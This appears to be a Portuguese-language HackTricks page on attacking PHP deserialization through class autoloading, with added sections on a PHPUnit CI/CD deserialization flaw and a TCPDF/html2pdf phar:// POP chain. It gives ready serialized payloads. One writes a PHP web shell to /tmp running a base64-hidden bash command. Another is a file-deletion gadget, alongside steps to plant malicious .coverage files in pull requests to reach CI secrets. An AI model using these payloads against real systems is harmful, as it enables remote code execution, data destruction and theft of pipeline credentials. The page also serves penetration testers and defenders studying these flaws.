# PHP - Deserialization + Autoload Classes

{{#include ../../banners/hacktricks-training.md}}

Primeiro, você deve checar o que são [**Autoloading Classes**](https://www.php.net/manual/en/language.oop5.autoload.php).

## PHP deserialization + spl_autoload_register + LFI/Gadget

Estamos em uma situação em que encontramos uma **PHP deserialization in a webapp** com **nenhuma** biblioteca vulnerável a gadgets dentro de **`phpggc`**. Entretanto, no mesmo container havia um **outro webapp com composer contendo bibliotecas vulneráveis**. Portanto, o objetivo foi **carregar o composer loader do outro webapp** e abusá‑lo para **carregar um gadget que explorasse essa biblioteca usando um gadget** do webapp vulnerável à deserialização.

Passos:

- Você encontrou uma **deserialization** e **não há nenhum gadget** no código do app atual
- Você pode abusar de uma função **`spl_autoload_register`** como a seguinte para **load any local file with `.php` extension**
- Para isso você usa uma deserialization onde o nome da classe vai ficar dentro de **`$name`**. Você **não pode usar "/" ou "."** em um nome de classe em um objeto serialized, mas o **code** está **replacing** os **underscores** ("_") **for slashes** ("/"). Então um nome de classe como `tmp_passwd` será transformado em `/tmp/passwd.php` e o código tentará carregá‑lo.\
Um **gadget example** será: **`O:10:"tmp_passwd":0:{}`**

<details>
<summary>spl_autoload_register LFI/autoload example</summary>
```php
spl_autoload_register(function ($name) {

if (preg_match('/Controller$/', $name)) {
$name = "controllers/${name}";
} elseif (preg_match('/Model$/', $name)) {
$name = "models/${name}";
} elseif (preg_match('/_/', $name)) {
$name = preg_replace('/_/', '/', $name);
}

$filename = "/${name}.php";

if (file_exists($filename)) {
require $filename;
}
elseif (file_exists(__DIR__ . $filename)) {
require __DIR__ . $filename;
}
});
```
</details>

> [!TIP]
> Se você tem um **file upload** e pode enviar um arquivo com **`.php` extension`** você poderia **abusar dessa funcionalidade diretamente** e já obter RCE.

No meu caso, eu não tinha nada assim, mas havia dentro do **mesmo container** outra página web do composer com uma **biblioteca vulnerável a um gadget `phpggc`**.

- Para carregar essa outra biblioteca, primeiro você precisa **carregar o composer loader daquela outra aplicação web** (porque o da aplicação atual não acessará as bibliotecas da outra). **Conhecendo o caminho da aplicação**, você pode conseguir isso muito facilmente com: **`O:28:"www_frontend_vendor_autoload":0:{}`** (No meu caso, o composer loader estava em `/www/frontend/vendor/autoload.php`)
- Agora, você pode **carregar** o composer loader do outro app, então é hora de **`generate the phpgcc`** o **payload** para usar. No meu caso, usei **`Guzzle/FW1`**, que me permitiu **escrever qualquer arquivo dentro do filesystem**.
- NOTA: O **gadget gerado não estava funcionando**; para que funcionasse eu **modifiquei** aquele payload **`chain.php`** do phpggc e defini **todos os atributos** das classes **de private para public**. Caso contrário, após desserializar a string, os atributos dos objetos criados não tinham nenhum valor.
- Agora temos a forma de **carregar o composer loader do outro app** e ter um **phpggc payload que funciona**, mas precisamos **fazer isso na MESMA REQUEST para o loader ser carregado quando o gadget for usado**. Para isso, enviei um array serializado com ambos os objetos assim:
- Você pode ver **primeiro o loader sendo carregado e então o payload**
```php
a:2:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}}
```
- Agora, podemos **criar e escrever um arquivo**, no entanto, o usuário **não conseguia escrever em nenhuma pasta dentro do servidor web**. Então, como você pode ver no payload, o PHP chamando **`system`** com algum **base64** é criado em **`/tmp/a.php`**. Em seguida, podemos **reutilizar o primeiro tipo de payload** que usamos como LFI para carregar o composer loader do outro webapp **e carregar o arquivo gerado `/tmp/a.php`**. Basta adicioná-lo ao deserialization gadget:
```php
a:3:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}s:6:"Extra3";O:5:"tmp_a":0:{} }
```
**Resumo do payload**

- **Load the composer autoload** de uma webapp diferente no mesmo container
- **Load a phpggc gadget** para abusar de uma biblioteca da outra webapp (a webapp inicial vulnerável à deserialization não tinha nenhum gadget em suas bibliotecas)
- O gadget irá **criar um arquivo com um PHP payload** em /tmp/a.php com comandos maliciosos (o usuário da webapp não consegue escrever em nenhuma pasta de qualquer webapp)
- A parte final do nosso payload irá usar **load the generated php file** que executará os comandos

Precisei **chamar essa deserialization duas vezes**. Nos meus testes, na primeira vez o arquivo `/tmp/a.php` foi criado mas não carregado, e na segunda vez foi corretamente carregado.

### Novidades do phpggc (2025)

- O **phpggc master branch continua adicionando chains**: OpenCart/RCE2, Drupal/FD1/SQLI1/XXE1, WordPress/YoastSEO/FW1 e outros chegaram em 2025 — útil quando a app alvo compartilha vendor code com esses projetos. Uma forma rápida de buscar é `phpggc -l | grep -E "OpenCart|Drupal|Yoast"` (atualize seu clone primeiro).
- Ao misturar gadgets entre apps via autoloading, lembre-se que **private properties em definições de gadget podem ser descartadas** quando classes são redeclaradas de forma diferente no alvo; edite o `chain.php` do gadget para tornar as propriedades `public` se o payload chegar com valores vazios (mesma técnica mostrada acima).

## PHPUnit PHPT coverage deserialization (CI/CD entrypoint)

`phpunit` antes de **8.5.52 / 9.6.34 / 10.5.63 / 11.5.50 / 12.5.8** (CVE-2026-24765) unserialized objetos PHP arbitrários a partir de arquivos `.coverage` produzidos pelo **PHPT runner**. Em pipelines CI onde colaboradores não confiáveis podem enviar testes, dropar um `.coverage` crafted aciona deserialization assim que a suite roda — não é necessário acesso web.

**Fluxo de ataque**

1. Colocar um arquivo `.coverage` malicioso no repo (ou artifact) contendo um gadget serialized que exista nas dependências de teste (por exemplo, uma chain do Monolog ou Guzzle do phpggc).
2. Submeter um PR; quando o CI executa `phpunit --configuration phpunit.xml`, o PHPT runner lê o arquivo de coverage e desserializa o gadget, dando **RCE inside the runner container**.
3. Isso é especialmente perigoso quando os testes montam CI secrets (cloud creds, deployment keys).

**Stub mínimo de .coverage malicioso** (colocar ao lado de um teste PHPT):
```php
<?php
$payload = file_get_contents('php://stdin'); // serialized gadget from phpggc
file_put_contents('exploit.coverage', $payload);
```
Run the PHPT so phpunit consumes `exploit.coverage`.

## TCPDF `__destruct` POP chain para exclusão arbitrária de arquivos

Quando uma instância real de `TCPDF` é coletada pelo garbage collector ela chama `_destroy(true)`, itera sobre `$this->imagekeys` e chama `unlink()` em qualquer coisa que pareça um arquivo de cache sob `K_PATH_CACHE`. Se uma aplicação executa `unserialize($user_data)` enquanto a classe `TCPDF` está carregada (e.g. ela espera um array com a chave `html`), você pode fornecer um objeto serializado que define:

- `file_id` para qualquer inteiro que não esteja presente em `self::$cleaned_ids` (e.g. `-1`).
- `imagekeys` para caminhos que começam com `K_PATH_CACHE` ou que podem ser manipulados para parecer com ele (e.g. `/tmp/../tmp/do_not_delete_this_file.txt` quando `K_PATH_CACHE` é `/tmp/`).

Exemplo de payload que atinge um fluxo inseguro `unserialize($_GET['p']); $pdf->writeHTML($payload['html']);`:
```text
a:1:{s:4:"html";O:5:"TCPDF":2:{s:7:"file_id";i:-1;s:9:"imagekeys";a:1:{i:0;s:39:"/tmp/../tmp/do_not_delete_this_file.txt";}}}
```
O arquivo é excluído assim que o objeto sai de escopo. TCPDF 6.9.3 apertou a verificação para remover apenas caminhos com o prefixo `__tcpdf_<file_id>_` dentro de `K_PATH_CACHE` e introduziu `_unlink()` para bloquear schemes não-`file://`, então versões mais antigas de `Producer` são alvos ideais.

### Acionando o gadget via `phar://` em tags `<cert>` do html2pdf

`spipu/html2pdf` (≤5.3.0) encapsula o TCPDF e expõe um bloco `<cert>` personalizado cujos atributos `src`/`privkey` são validados com `file_exists()` simples. No PHP < 8.0 qualquer função de filesystem que acesse uma URL `phar://` faz com que os metadados do Phar sejam unserializados. Ao armazenar o objeto TCPDF malicioso acima dentro de um arquivo Phar você obtém um POP confiável mesmo se a aplicação nunca chamar `unserialize()` por si só.

1. Crie um Phar com `phar.readonly=0`, configure o stub/manifest para parecer uma imagem (por exemplo renomeie `archive.phar` para `archive.png`), e armazene o objeto TCPDF serializado nos metadados do Phar.
2. Faça upload/coloque o arquivo em algum lugar acessível, por exemplo `/tmp/user_files/user_1/archive.png`.
3. Submeta HTML contendo a tag `<cert>` para que o html2pdf resolva o caminho controlado pelo atacante:
```html
<cert src="phar:///tmp/user_files/user_1/archive.png"
privkey="phar:///tmp/user_files/user_1/archive.png" />
```
A chamada para `file_exists()` desserializa os metadados, instancia o TCPDF, e seu destrutor exclui o arquivo escolhido, transformando o html2pdf em um poderoso ponto de entrada `phar://`. A versão 5.3.1 adicionou `Security::checkValidPath()` para bloquear esquemas não aprovados, portanto implantações legadas continuam atraentes.

## Referências

- [Positive Technologies – Blind Trust: What Is Hidden Behind the Process of Creating Your PDF File?](https://swarm.ptsecurity.com/blind-trust-what-is-hidden-behind-the-process-of-creating-your-pdf-file/)
- [GitLab Advisory – CVE-2024-51058 TCPDF Hash Comparison / Phar Deserialization](https://advisories.gitlab.com/pkg/composer/tecnickcom/tcpdf/)
- [CVE-2026-24765 – PHPUnit PHPT Coverage Unsafe Deserialization](https://cvereports.com/reports/CVE-2026-24765)

{{#include ../../banners/hacktricks-training.md}}
